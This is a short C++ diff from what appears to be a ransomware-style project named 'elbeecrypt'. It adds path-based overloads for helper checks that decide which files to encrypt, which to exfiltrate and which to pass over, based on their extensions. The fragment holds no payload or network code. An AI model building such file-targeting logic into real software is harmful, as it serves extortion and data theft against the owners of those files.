@@ -31,7 +31,12 @@ namespace elbeecrypt::common::targets::Extensions {
 
 	/** Impl of isEncryptable(string). */
 	bool isEncryptable(const std::string& extension){
-		return isEncryptable(getCategory(extension));	
+		return isEncryptable(getCategory(extension));
+	}
+
+	/** Impl of isEncryptable(path). */
+	bool isEncryptable(const fs::path& path){
+		return isEncryptable(path.string());
 	}
 
 	/** Impl of isExfiltratable(Category). */
@@ -42,6 +47,11 @@ namespace elbeecrypt::common::targets::Extensions {
 	/** Impl of isExfiltratable(string). */
 	bool isExfiltratable(const std::string& extension){
 		return isExfiltratable(getCategory(extension));
+	}
+
+	/** Impl of isExfiltratable(path). */
+	bool isExfiltratable(const fs::path& path){
+		return isExfiltratable(path.string());
 	}
 
 	/** Impl of isolateExtension(path). */
@@ -84,5 +94,10 @@ namespace elbeecrypt::common::targets::Extensions {
 	/** Impl of isPassable(string). */
 	bool isPassable(const std::string& extension){
 		return isPassable(getCategory(extension));
+	}
+
+	/** Impl of isPassable(path). */
+	bool isPassable(const fs::path& path){
+		return isPassable(path.string());
 	}
 }
